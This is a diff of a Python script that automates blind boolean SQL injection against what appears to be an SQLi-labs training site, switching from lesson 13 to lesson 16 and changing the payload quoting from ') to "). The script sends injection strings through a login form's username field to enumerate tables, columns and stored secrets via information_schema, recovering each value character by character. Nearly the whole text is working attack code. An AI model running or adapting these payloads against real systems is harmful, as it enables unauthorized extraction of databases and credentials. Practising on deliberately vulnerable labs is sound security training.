@@ -1,22 +1,14 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Created on Thu Apr  8 18:42:42 2021
-
-@author: rohit
-"""
-
 import requests
 
 
 get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
 get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
 get_secret = "(select group_concat({0}) from {1} )"
-url = "https://sqlilabs.carelessfinch.me/Less-13/"
+url = "https://sqlilabs.carelessfinch.me/Less-16/"
 session = requests.Session()
 def getsize(find):
     leng=0
-    payload = "') or (length({0})={1})#"
+    payload = '") or (length({0})={1})#'
     for i in range(400):
         response = requests.post(url,data={'uname':payload.format(find,i),'passwd':''})
         if ('<img src="../images/flag.jpg" />' in response.text):
@@ -25,7 +17,7 @@ def getsize(find):
     return leng
 
 def getname(leng,find):
-     payload = "') or (ord(substr({0},{1},1))>={2})#"
+     payload = '") or (ord(substr({0},{1},1))>={2})#'
      name=""
      number_of_request = 0
      for i in range(1,leng):
